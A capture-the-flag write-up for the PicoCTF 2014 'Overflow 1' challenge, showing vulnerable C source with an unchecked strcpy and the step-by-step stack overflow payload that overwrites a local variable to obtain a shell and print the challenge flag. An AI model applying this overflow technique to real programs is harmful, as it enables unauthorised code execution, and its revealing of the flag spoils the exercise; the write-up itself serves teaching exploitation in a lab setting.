# Pico CTF 2014 : Overflow 1

**Category:** Binary Exploitation
**Points:** 50
**Description:**

>This problem has a buffer overflow vulnerability! Can you get a shell, then use that shell to read flag.txt? You can solve this problem interactively [here](https://picoctf.com/problem-static/binary/Overflow1/overflow1.html#1), and the source can be found [here](oveflow1.c).

**Hint:**
>Can you overflow into the 'secret' variable?

## Write-up

Looking at the source code, there is an unfortunate error on the programmer's
part. Lucky us :D

```
void vuln(char *input){
    char buf[16];
    int secret = 0;
    strcpy(buf, input);

    if (secret == 0xc0deface){
        give_shell();
    }else{
        printf("The secret is %x\n", secret);
    }
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}
```

The program takes input from the terminal as an argument, then calls `strcpy()`
on it. This leads to a buffer overflow attack. This attack allows us to
potentially overwrite variables on the stack, namely `secret`. Let's supply
some bytes to see what happens.

```
/home/overflow1$ ./overflow1 $(python -c 'print "A"*16 + "BBBB"')
The secret is 42424242
```

Some trial and error will reveal that we can control the `secret` variable
after we supply 16 bytes. the 42424242 is the hex values of our "B"s that were
supplied. Let's try to overwrite it with 1337 and get a shell!

```
/home/overflow1$ ./overflow1 $(python -c 'print "A"*16 + "c0deface"')
The secret is 65643063
```
Unfortunately it isn't this simple. **We can only overwrite the byte values of
the characters we provide.** Luckily python has escape sequences.
```
c0deface becomes "\xc0\xde\xfa\xce".
If we adjust it to little endian: "\xce\xfa\xde\xc0"

/home/overflow1$ ./overflow1 $(python -c 'print "A"*16 + "\xce\xfa\xde\xc0"')
$ ls
flag.txt  Makefile  overflow1  overflow1.c
$ cat flag.txt
ooh_so_critical
```
## Other write-ups and resources

* <http://ehsandev.com/pico2014/binary_exploitation/overflow1.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-overflow1/>
